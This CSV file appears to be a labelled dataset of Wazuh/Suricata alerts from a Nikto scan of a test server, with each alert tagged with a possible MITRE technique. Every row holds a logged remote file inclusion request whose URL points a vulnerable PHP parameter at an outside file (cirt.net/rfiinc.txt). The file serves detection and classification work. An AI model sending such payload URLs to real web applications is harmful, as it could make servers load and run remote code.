timestamp,alert,description,real_ttps,possible_ttps
2025-10-14T11:00:15.317+0000,"{""timestamp"": ""2025-10-14T11:00:15.317+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS KR-Web krgourl.php DOCUMENT_ROOT Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 537, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439615.4799848"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.182862+0000"", ""flow_id"": ""631685220984396.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41164"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:owK3Tdv7TXra+UlKEdsNNTxaPaI="", ""tx_id"": ""44"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010475"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS KR-Web krgourl.php DOCUMENT_ROOT Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/adm/krgourl.php?DOCUMENT_ROOT=http://cirt.net/rfiinc.txt??"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004061)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""49"", ""pkts_toclient"": ""68"", ""bytes_toserver"": ""12517"", ""bytes_toclient"": ""22317"", ""start"": ""2025-10-14T11:00:04.124492+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS KR-Web krgourl.php DOCUMENT_ROOT Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-10-14T11:00:15.391+0000,"{""timestamp"": ""2025-10-14T11:00:15.391+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Golem Gaming Portal root_path Parameter Remote File inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 538, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439615.4802586"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.205211+0000"", ""flow_id"": ""631685220984396.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41164"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:owK3Tdv7TXra+UlKEdsNNTxaPaI="", ""tx_id"": ""62"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2012795"", ""rev"": ""4"", ""signature"": ""ET WEB_SPECIFIC_APPS Golem Gaming Portal root_path Parameter Remote File inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2011_05_09""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_04_20""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/admin/admin_news_bot.php?root_path=http://cirt.net/rfiinc.txt??"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004079)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""67"", ""pkts_toclient"": ""86"", ""bytes_toserver"": ""17310"", ""bytes_toclient"": ""30633"", ""start"": ""2025-10-14T11:00:04.124492+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Golem Gaming Portal root_path Parameter Remote File inclusion Attempt,[],['T1595.002']
2025-10-14T11:00:15.770+0000,"{""timestamp"": ""2025-10-14T11:00:15.770+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla Dada Mail Manager Component config.dadamail.php GLOBALS Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 540, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439615.4858517"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.320699+0000"", ""flow_id"": ""2162641346028504.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41168"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:eNR6+XUlNgrLAlVHK0HRmOkozFY="", ""tx_id"": ""51"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009384"", ""rev"": ""7"", ""signature"": ""ET WEB_SPECIFIC_APPS Joomla Dada Mail Manager Component config.dadamail.php GLOBALS Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/administrator/components/com_dadamail/config.dadamail.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004168)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""56"", ""pkts_toclient"": ""69"", ""bytes_toserver"": ""15820"", ""bytes_toclient"": ""25155"", ""start"": ""2025-10-14T11:00:04.254936+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla Dada Mail Manager Component config.dadamail.php GLOBALS Parameter Remote File Inclusion,[],['T1595.002']
2025-10-14T11:00:15.923+0000,"{""timestamp"": ""2025-10-14T11:00:15.923+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla Onguma Time Sheet Component onguma.class.php mosConfig_absolute_path Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 541, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439615.4906205"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.364724+0000"", ""flow_id"": ""2162641346028504.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41168"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:eNR6+XUlNgrLAlVHK0HRmOkozFY="", ""tx_id"": ""88"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009391"", ""rev"": ""7"", ""signature"": ""ET WEB_SPECIFIC_APPS Joomla Onguma Time Sheet Component onguma.class.php mosConfig_absolute_path Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004205)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""93"", ""pkts_toclient"": ""106"", ""bytes_toserver"": ""27564"", ""bytes_toclient"": ""42249"", ""start"": ""2025-10-14T11:00:04.254936+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla Onguma Time Sheet Component onguma.class.php mosConfig_absolute_path Parameter Remote File Inclusion,[],['T1595.002']
2025-10-14T11:00:15.942+0000,"{""timestamp"": ""2025-10-14T11:00:15.942+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla Simple RSS Reader admin.rssreader.php mosConfig_live_site Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 542, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439615.4915337"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.369687+0000"", ""flow_id"": ""2162641346028504.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41168"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:eNR6+XUlNgrLAlVHK0HRmOkozFY="", ""tx_id"": ""92"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009369"", ""rev"": ""7"", ""signature"": ""ET WEB_SPECIFIC_APPS Joomla Simple RSS Reader admin.rssreader.php mosConfig_live_site Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_11""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004209)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""97"", ""pkts_toclient"": ""110"", ""bytes_toserver"": ""28830"", ""bytes_toclient"": ""44095"", ""start"": ""2025-10-14T11:00:04.254936+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla Simple RSS Reader admin.rssreader.php mosConfig_live_site Parameter Remote File Inclusion,[],['T1595.002']
2025-10-14T11:00:15.954+0000,"{""timestamp"": ""2025-10-14T11:00:15.954+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla swMenuPro ImageManager.php Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 543, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439615.4921225"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.372174+0000"", ""flow_id"": ""2162641346028504.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41168"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:eNR6+XUlNgrLAlVHK0HRmOkozFY="", ""tx_id"": ""94"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2012369"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS Joomla swMenuPro ImageManager.php Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2011_02_25""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_13""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004211)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""99"", ""pkts_toclient"": ""112"", ""bytes_toserver"": ""29480"", ""bytes_toclient"": ""45017"", ""start"": ""2025-10-14T11:00:04.254936+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS Joomla swMenuPro ImageManager.php Remote File Inclusion Attempt,[],['T1595.002']
2025-10-14T11:00:16.028+0000,"{""timestamp"": ""2025-10-14T11:00:16.028+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS PHP phpMyAgenda rootagenda Remote File Include Attempt"", ""id"": ""86601"", ""firedtimes"": 544, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439616.4947134"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.395947+0000"", ""flow_id"": ""1127990166866110.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41180"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:f+bv4iiBO35PtP2AwsTpvQUeaUk="", ""tx_id"": ""11"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2002879"", ""rev"": ""9"", ""signature"": ""ET WEB_SPECIFIC_APPS PHP phpMyAgenda rootagenda Remote File Include Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""affected_product"": [""Any""], ""attack_target"": [""Server""], ""created_at"": [""2010_07_30""], ""cve"": [""CVE_2006_2009""], ""deployment"": [""Datacenter""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""tag"": [""Remote_File_Include""], ""updated_at"": [""2020_09_10""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/agenda.php3?rootagenda=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004229)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""16"", ""pkts_toclient"": ""23"", ""bytes_toserver"": ""3816"", ""bytes_toclient"": ""6279"", ""start"": ""2025-10-14T11:00:04.379070+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS PHP phpMyAgenda rootagenda Remote File Include Attempt,[],['T1595.002']
2025-10-14T11:00:16.154+0000,"{""timestamp"": ""2025-10-14T11:00:16.154+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS phptraverse mp3_id.php GLOBALS Parameter Remote File Inclusion Attempt"", ""id"": ""86601"", ""firedtimes"": 549, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439616.4992580"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:04.434093+0000"", ""flow_id"": ""1127990166866110.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41180"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:f+bv4iiBO35PtP2AwsTpvQUeaUk="", ""tx_id"": ""38"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2010485"", ""rev"": ""5"", ""signature"": ""ET WEB_SPECIFIC_APPS phptraverse mp3_id.php GLOBALS Parameter Remote File Inclusion Attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_10""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=http://cirt.net/rfiinc.txt??cmd"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004256)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""43"", ""pkts_toclient"": ""50"", ""bytes_toserver"": ""11060"", ""bytes_toclient"": ""18753"", ""start"": ""2025-10-14T11:00:04.379070+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS phptraverse mp3_id.php GLOBALS Parameter Remote File Inclusion Attempt,[],['T1595.002']
2025-10-14T11:00:16.821+0000,"{""timestamp"": ""2025-10-14T11:00:16.821+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS ProjectButler RFI attempt"", ""id"": ""86601"", ""firedtimes"": 556, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439616.5087250"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:05.926156+0000"", ""flow_id"": ""1341005512402419.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41348"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:S1JxhiW4dqY/IFp26TkoxNeUIW8="", ""tx_id"": ""38"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009887"", ""rev"": ""7"", ""signature"": ""ET WEB_SPECIFIC_APPS ProjectButler RFI attempt"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_10""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/pda/pda_projects.php?offset=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005548)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""43"", ""pkts_toclient"": ""52"", ""bytes_toserver"": ""11051"", ""bytes_toclient"": ""18885"", ""start"": ""2025-10-14T11:00:05.878067+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS ProjectButler RFI attempt,[],['T1595.002']
2025-10-14T11:00:17.628+0000,"{""timestamp"": ""2025-10-14T11:00:17.628+0000"", ""rule"": {""level"": 3, ""description"": ""Suricata: Alert - ET WEB_SPECIFIC_APPS phPortal gunaysoft.php icerikyolu Parameter Remote File Inclusion"", ""id"": ""86601"", ""firedtimes"": 561, ""mail"": false, ""groups"": [""ids"", ""suricata""]}, ""agent"": {""id"": ""002"", ""name"": ""inetfw"", ""ip"": ""192.168.100.254""}, ""manager"": {""name"": ""wazuh""}, ""id"": ""1760439617.5108729"", ""decoder"": {""name"": ""json""}, ""data"": {""timestamp"": ""2025-10-14T11:00:06.188171+0000"", ""flow_id"": ""2066721841510437.000000"", ""in_iface"": ""ens5"", ""event_type"": ""alert"", ""src_ip"": ""192.42.1.174"", ""src_port"": ""41374"", ""dest_ip"": ""172.17.100.121"", ""dest_port"": ""80"", ""proto"": ""TCP"", ""community_id"": ""1:abOnSaUBCcp4FEK8dy8vqdyfc/M="", ""tx_id"": ""22"", ""alert"": {""action"": ""allowed"", ""gid"": ""1"", ""signature_id"": ""2009325"", ""rev"": ""6"", ""signature"": ""ET WEB_SPECIFIC_APPS phPortal gunaysoft.php icerikyolu Parameter Remote File Inclusion"", ""category"": ""Web Application Attack"", ""severity"": ""1"", ""metadata"": {""created_at"": [""2010_07_30""], ""mitre_tactic_id"": [""TA0001""], ""mitre_tactic_name"": [""Initial_Access""], ""mitre_technique_id"": [""T1190""], ""mitre_technique_name"": [""Exploit_Public_Facing_Application""], ""signature_severity"": [""Major""], ""updated_at"": [""2020_09_10""]}}, ""http"": {""hostname"": ""video.attackbed.com"", ""url"": ""/sablonlar/gunaysoft/gunaysoft.php?icerikyolu=http://cirt.net/rfiinc.txt?"", ""http_user_agent"": ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005729)"", ""http_content_type"": ""text/html"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": ""404"", ""length"": ""196""}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": ""27"", ""pkts_toclient"": ""34"", ""bytes_toserver"": ""6523"", ""bytes_toclient"": ""11361"", ""start"": ""2025-10-14T11:00:06.161829+0000""}}, ""location"": ""/var/log/suricata/eve.json""}",Suricata: Alert - ET WEB_SPECIFIC_APPS phPortal gunaysoft.php icerikyolu Parameter Remote File Inclusion,[],['T1595.002']
